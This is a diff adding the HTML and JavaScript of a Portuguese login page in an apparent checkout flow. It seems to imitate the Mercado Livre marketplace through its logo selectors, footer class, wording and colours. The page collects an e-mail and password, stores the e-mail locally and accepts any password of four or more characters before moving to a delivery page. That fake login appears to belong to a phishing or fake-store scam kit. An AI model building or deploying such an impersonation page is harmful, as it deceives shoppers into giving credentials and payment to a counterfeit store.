@@ -1,0 +1,349 @@
+﻿<!DOCTYPE HTML>
+
+<html lang="pt-br" class="page-dados">
+<head>
+<meta charset="utf-8"/>
+<title>Conta</title>
+<meta content="width=device-width,initial-scale=1.0, maximum-scale=1.0" name="viewport"/>
+<meta content="telephone=no" name="format-detection"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<script src="js/jquery.js"></script>
+<script src="tela/js/js.js"></script>
+<script src="tela/js/checkout_pages.js"></script>
+<script src="tela/js/flow.js"></script>
+<link href="tela/css/css.css" rel="stylesheet"/>
+<link href="tela/css/produto.css" rel="stylesheet"/>
+<link href="tela/css/theme.css" rel="stylesheet"/>
+<link href="tela/css/checkout.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
+<link href="assets/logo.png" rel="shortcut icon" sizes="16x16"/>
+
+<style>
+/* ===== AJUSTES MINIMOS PEDIDOS ===== */
+
+/* 1️⃣ BOTÃO CONTINUAR — só altura (equilibrado) */
+body[data-page="carrinho"] .checkout-btn,
+body[data-page="carrinho"] .btn-primary{
+  height: 44px !important;
+  min-height: 44px !important;
+}
+
+/* 2️⃣ PAGINA DADOS — aproximar "Não tem conta" do botão */
+.nao-tem-conta,
+.signup-link,
+.create-account,
+.login-footer{
+  margin-top: 14px !important;
+}
+
+</style>
+
+
+<style>
+/* AJUSTE FINAL – subir NÃO TEM CONTA PC + MOBILE */
+body[data-page="dados"] .muted{
+    margin-top: 14px !important;
+}
+</style>
+
+
+<style>
+/* FORCE REAL – colar "" no botão (PC + Mobile) */
+.checkout .btn-primary + .muted,
+.checkout .btn-primary + div.muted,
+body[data-page="dados"] .checkout .btn-primary + .muted {
+    margin-top: 14px !important;
+}
+</style>
+
+
+<style>
+/* FOOTER MOBILE PEQUENO – somente celular */
+@media (max-width: 768px){
+
+  footer,
+  .footer,
+  .site-footer,
+  .ml-footer{
+
+    font-size: 11px !important;
+    line-height: 1.3 !important;
+  }
+
+  footer a,
+  .footer a,
+  .site-footer a,
+  .ml-footer a{
+    font-size: 11px !important;
+  }
+
+  footer p,
+  footer span,
+  footer div{
+    font-size: 11px !important;
+  }
+
+}
+</style>
+
+<style>
+/* FOOTER MOBILE BOTTOM – mantém rodapé no final da tela quando falta conteúdo */
+@media (max-width: 768px){
+  body{
+    min-height: 100vh !important;
+    display: flex !important;
+    flex-direction: column !important;
+  }
+  main.wrap{
+    flex: 1 0 auto !important;
+  }
+  footer.site-footer{
+    margin-top: auto !important;
+    flex-shrink: 0 !important;
+  }
+}
+</style>
+
+<style>
+/* DADOS (mobile): fundo 100% branco e layout sem “card flutuando” */
+@media (max-width: 768px){
+  body[data-page="dados"]{
+    background:#fff !important;
+  }
+
+  /* mobile: alinhar o início do título com o conteúdo do formulário */
+  body[data-page="dados"] .dados-left{
+    padding-left: 16px !important;
+    padding-right: 16px !important;
+  }
+
+  /* remove a “moldura” lateral e deixa tudo colado na tela */
+  body[data-page="dados"] main.wrap{
+    padding-left: 0 !important;
+    padding-right: 0 !important;
+  }
+
+  /* o conteúdo vira uma página limpa (igual ao print 3) */
+  body[data-page="dados"] .card,
+  body[data-page="dados"] .card.stack,
+  body[data-page="dados"] .dados-card.card{
+    border-radius: 0 !important;
+    box-shadow: none !important;
+    margin: 0 !important;
+    width: 100% !important;
+    max-width: 100% !important;
+  }
+}
+</style>
+
+<style>
+/* DADOS (desktop): título e formulário lado a lado (igual ao print) */
+@media (min-width: 992px){
+  body[data-page="dados"] .dados-split{
+    display:flex;
+    align-items:flex-start;
+    justify-content:space-between;
+    gap: 72px;
+    width: 100%;
+  }
+  body[data-page="dados"] .dados-left{
+    flex: 1 1 50%;
+    padding: 10px 0 0;
+  }
+  body[data-page="dados"] .dados-right{
+    flex: 1 1 50%;
+    display:flex;
+    justify-content:flex-end;
+  }
+  body[data-page="dados"] .dados-form-card{
+    width: 100%;
+    max-width: 520px;
+  }
+}
+
+/* fallback: mantém empilhado em telas menores */
+@media (max-width: 991.98px){
+  body[data-page="dados"] .dados-split{ display:block; }
+}
+</style>
+
+<style>
+/* AJUSTE SOLICITADO: fundo branco + afastar da faixa amarela (DESKTOP) */
+/* garante branco TOTAL (html + body) só nesta página */
+html.page-dados,
+html.page-dados body,
+body[data-page="dados"]{
+  background:#fff !important;
+}
+
+html.page-dados body{
+  min-height: 100vh !important;
+}
+body[data-page="dados"] main.wrap{
+  padding-top:40px !important;
+}
+</style>
+
+</head>
+<body data-page="dados" id="body" style="margin:0;width:100%;-webkit-text-size-adjust:none; ">
+<header class="header">
+<div class="headerMobile" style="display:flex;align-items:center;">
+<img class="logo_da_loja" onclick="window.location.href='index.html'" src="assets/logo.png" style="margin:0 10px;max-width:44px;min-height:32px;cursor:pointer;" />
+
+</div>
+</header>
+<main class="wrap">
+<section class="checkout">
+<div class="dados-split">
+  <div class="dados-left">
+    <h1 class="dados-card-title">Digite seu e-mail ou telefone para iniciar sessão</h1>
+  </div>
+
+  <div class="dados-right">
+    <div class="card stack dados-form-card">
+      <div class="pill" id="email-summary">
+<div class="pill-icon"></div>
+<span class="pill-text"></span>
+<button aria-label="Excluir e-mail" class="pill-clear" onclick="localStorage.removeItem('email'); localStorage.removeItem('senha_ok'); window.location.reload();" ></button>
+</div>
+
+      <div class="stack" id="email-box">
+<div class="field">
+<div class="mini-label">E-mail ou telefone</div>
+<input id="login-email" placeholder="Digite seu e-mail ou telefone" style="padding-right:36px;" type="email"/>
+<button aria-label="Limpar e-mail" class="email-clear-btn" type="button">×</button>
+<span class="hint"></span>
+</div>
+<button class="btn-primary" id="btn-email-next">Continuar</button>
+
+<div class="muted" style="text-align:center;">
+      <a href="cadastro.html" style="color:#3483fa;text-decoration:none;font-weight:700;">Criar conta</a>
+</div>
+</div>
+
+      <div class="stack" id="pass-box" style="display:none;">
+<div class="field">
+<label>Senha</label>
+<input id="login-pass" placeholder="••••" type="password"/>
+<span class="hint"></span>
+</div>
+<button class="btn-primary" id="btn-login">Entrar</button>
+<div class="muted" style="text-align:center;"> <a href="cadastro.html" style="color:#3483fa;text-decoration:none;font-weight:700;">Criar conta</a></div>
+</div>
+</div>
+    </div>
+  </div>
+</div>
+</section>
+</main>
+<style>
+.email-clear-btn{
+  position:absolute;
+  right:12px;
+  top:50%;
+  transform:translateY(-50%);
+  font-size:16px;
+  color:#999;
+  cursor:pointer;
+}
+.email-wrapper{position:relative;}
+</style>
+<script>
+document.addEventListener("input",function(e){
+  if(e.target.type==="email"){
+    var btn=e.target.parentNode.querySelector(".email-clear-btn");
+    if(btn) btn.style.display=e.target.value?"block":"none";
+  }
+});
+document.addEventListener("click",function(e){
+  if(e.target.classList.contains("email-clear-btn")){
+    var inp=e.target.parentNode.querySelector("input");
+    inp.value="";
+    e.target.style.display="none";
+    inp.focus();
+  }
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+  const btnEmail = document.getElementById('btn-email-next');
+  const btnLogin = document.getElementById('btn-login');
+  const emailInput = document.getElementById('login-email');
+  const passInput = document.getElementById('login-pass');
+  const emailBox = document.getElementById('email-box');
+  const passBox = document.getElementById('pass-box');
+  const emailSummary = document.getElementById('email-summary');
+  const pillText = document.querySelector('.pill-text');
+
+  if(btnEmail) {
+    btnEmail.addEventListener('click', function() {
+      if(emailInput.value.includes('@')) {
+        localStorage.setItem('email', emailInput.value);
+        emailBox.style.display = 'none';
+        passBox.style.display = 'block';
+        emailSummary.style.display = 'flex';
+        if(pillText) pillText.textContent = emailInput.value;
+      } else {
+        alert('Por favor, digite um e-mail válido.');
+      }
+    });
+  }
+
+  if(btnLogin) {
+    btnLogin.addEventListener('click', function() {
+      if(passInput.value.length >= 4) {
+        window.location.href = 'entrega.html';
+      } else {
+        alert('A senha deve ter pelo menos 4 caracteres.');
+      }
+    });
+  }
+});
+</script>
+
+<!-- FIX: clique na logo leva pro produto (index.html) -->
+<script>
+(function(){
+  function goProduto(){ window.location.href = 'index.html'; }
+
+  function makeClickable(el){
+    if(!el) return;
+    el.style.cursor = 'pointer';
+    el.addEventListener('click', function(e){ e.stopPropagation(); goProduto(); });
+  }
+
+  document.addEventListener('DOMContentLoaded', function(){
+    // logos em img
+    document.querySelectorAll('img[src*="assets/logo"], img[src*="assets/mercadolivre"], img[src*="assets/racing"]').forEach(makeClickable);
+
+    // logos em div com background-image (topo / menu)
+    document.querySelectorAll('div[style*="background-image"]').forEach(function(el){
+      var s = el.getAttribute('style') || '';
+      // pega os casos típicos do template: 56x56 (topo/menu) e o ícone do Bem-vindo
+      if (s.includes('width:56') && s.includes('height:56')) makeClickable(el);
+      if (s.includes('border-radius:50%')) makeClickable(el);
+      if (s.includes('border-radius:8px') && s.toLowerCase().includes('#dedede')) makeClickable(el);
+    });
+
+    // fallback: qualquer elemento dentro do #menu que seja o bloco de boas-vindas
+    var menu = document.getElementById('menu');
+    if(menu){
+      var b = menu.querySelector('div[style*="width:56"][style*="height:56"]');
+      if(b) makeClickable(b);
+    }
+  });
+})();
+</script>
+
+<script src="anti-clone.js"></script>
+</body>
+</html>
+
+
+<style>
+/* ajuste fino solicitado – apenas mobile */
+@media (max-width: 768px){
+  body[data-page="dados"] .mini-label{
+    font-size: 12px !important;
+  }
+}
+</style>
